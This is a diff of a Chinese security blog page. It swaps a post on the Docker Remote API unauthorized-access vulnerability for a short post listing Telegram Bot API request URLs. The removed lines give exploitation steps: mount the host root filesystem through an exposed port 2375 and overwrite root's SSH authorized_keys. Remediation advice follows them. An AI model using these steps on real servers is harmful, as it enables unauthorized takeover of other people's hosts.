@@ -123,7 +123,7 @@
 
 
 
-  <title>Docker Remote API未授权访问漏洞 | 初心·守一</title>
+  <title>使用Telegram API接收消息 | 初心·守一</title>
   
 
 
@@ -263,7 +263,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://reboot.cf/2016/08/18/Docker-Remote-API未授权访问漏洞/">
+    <link itemprop="mainEntityOfPage" href="http://reboot.cf/2018/03/12/使用Telegram-API接收消息/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="初心·守一">
@@ -280,7 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Docker Remote API未授权访问漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">使用Telegram API接收消息</h1>
         
 
         <div class="post-meta">
@@ -292,7 +292,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-08-18T14:23:44+08:00">2016-08-18</time>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-12T14:51:36+08:00">2018-03-12</time>
             
 
             
@@ -328,21 +328,14 @@
       
 
       
-        <p>Docker是一个开源的应用容器引擎，允许开发者将其应用和依赖包打包到一个可移植的容器中，并发布到任何流行的Linux机器上，以实现虚拟化<br><a id="more"></a></p>
-<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Docker的<code>Remote API</code>因配置不当可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可访问到Docker数据，可能导致敏感信息泄露，黑客也可以恶意删除Docker上的数据；攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>访问<code>http</code>请求<code>curl x.x.x.x:2375/info</code><br>如果返回码<code>200</code>，并且返回<code>DockerRootDir</code>等字符，则证明存在目标存在未授权访问漏洞。<br>查看以有镜像列表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://0.0.0.0:2375 images</span><br></pre></td></tr></table></figure>
-<p>如果不存在镜像，可主动<code>pull</code>一个，其中默认存在的镜像中<code>busybox</code>体积最小，这里拿<code>Ubuntu</code>举例。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://0.0.0.0:2375 pull ubuntu</span><br></pre></td></tr></table></figure>
-<p>运行容器并挂载系统根目录（/）。该命令将宿主根目录（/）挂载到容器中/mnt目录下，所有操作在mnt目录下进行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://0.0.0.0:2375 run -v /:/mnt -ti ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
-<p>生成ssh免密码登录<code>key</code>，得到<code>id_rsa.pub</code>文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen –t rsa –C <span class="string">"root"</span></span><br></pre></td></tr></table></figure>
-<p>替换对应<code>/mnt/root/.ssh/authorized_keys</code>文件内容。（测试过程记得保存原始）<br>直接ssh登录即可。</p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="修改Docker-Remote-API服务默认参数"><a href="#修改Docker-Remote-API服务默认参数" class="headerlink" title="修改Docker Remote API服务默认参数"></a>修改Docker Remote API服务默认参数</h2><p>注意：该操作需要重启Docker服务才能生效<br>修改Docker的启动参数：<br>定位到<code>DOCKER_OPTS</code>中的<code>tcp://0.0.0.0:2375</code>，将<code>0.0.0.0修</code>改为<code>127.0.0.1</code>或将默认端口<code>2375</code>改为自定义端口</p>
-<h2 id="为Remote-API设置认证措施"><a href="#为Remote-API设置认证措施" class="headerlink" title="为Remote API设置认证措施"></a>为Remote API设置认证措施</h2><p>参照<a href="https://docs.docker.com/develop/sdk/" target="_blank" rel="noopener">官方文档</a>配置Remote API的认证措施<br>注意：该操作需要重启<code>Docker</code>服务才能生效。<br>修改Docker服务运行账号，请以较低权限账号运行<code>Docker</code>服务；另外，可以限制攻击者执行高危命令。<br>注意：该操作需要重启<code>Docker</code>服务才能生效。</p>
-<h2 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h2><p>如果正常业务中<code>API</code>服务需要被其他服务器来访问，可以配置安全组策略或<code>iptables</code>策略，仅允许指定的<code>IP</code>来访问<code>Docker</code>接口。</p>
-
+        <a id="more"></a>
+<p>Telegram Bot API <a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">文档地址</a></p>
+<p>发送请求</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org/bot<span class="tag">&lt;<span class="name">token</span>&gt;</span>/METHOD_NAME</span><br></pre></td></tr></table></figure>
+<p>获取更新数据</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org//bot<span class="tag">&lt;<span class="name">token</span>&gt;</span>/getUpdates</span><br></pre></td></tr></table></figure>
+<p>发送消息</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org/bot&#123;token&#125;/sendMessage?chat_id=&#123;chat_id&#125;&amp;text=&#123;data&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -357,14 +350,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Tips/" rel="tag"># Tips</a>
-          
-            <a href="/tags/Vulnerability/" rel="tag"># Vulnerability</a>
-          
-        </div>
-      
 
       
       
@@ -374,8 +359,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/18/ImageMagick命令执行/" rel="next" title="ImageMagick命令执行">
-                <i class="fa fa-chevron-left"></i> ImageMagick命令执行
+              <a href="/2018/03/12/利用js获取前端登录密码/" rel="next" title="利用js获取前端登录密码">
+                <i class="fa fa-chevron-left"></i> 利用js获取前端登录密码
               </a>
             
           </div>
@@ -384,8 +369,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/09/18/Git基本使用/" rel="prev" title="Git基本使用">
-                Git基本使用 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/03/14/MySQL写Webshell/" rel="prev" title="MySQL写Webshell">
+                MySQL写Webshell <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -435,17 +420,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -523,22 +499,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞修复"><span class="nav-number">3.</span> <span class="nav-text">漏洞修复</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#修改Docker-Remote-API服务默认参数"><span class="nav-number">3.1.</span> <span class="nav-text">修改Docker Remote API服务默认参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为Remote-API设置认证措施"><span class="nav-number">3.2.</span> <span class="nav-text">为Remote API设置认证措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置防火墙策略"><span class="nav-number">3.3.</span> <span class="nav-text">设置防火墙策略</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
